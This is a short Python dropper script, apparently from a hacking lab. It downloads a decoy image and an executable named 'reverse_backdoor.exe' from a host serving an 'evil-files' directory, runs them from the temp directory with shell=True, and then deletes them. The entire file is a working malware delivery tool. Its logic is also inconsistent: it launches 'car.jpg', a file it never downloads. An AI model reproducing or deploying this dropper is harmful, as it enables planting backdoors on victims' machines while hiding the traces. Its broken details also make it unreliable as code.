#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_dierectory = tempfile.gettempdir()
os.chdir(temp_dierectory)

download("http://10.0.2.15/evil-files/r32.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.15/evil-files/reverse_backdoor.exe")
subprocess.call("r32.jpg", shell=True)

os.remove("r32.jpg")
os.remove("reverse_backdoor.exe")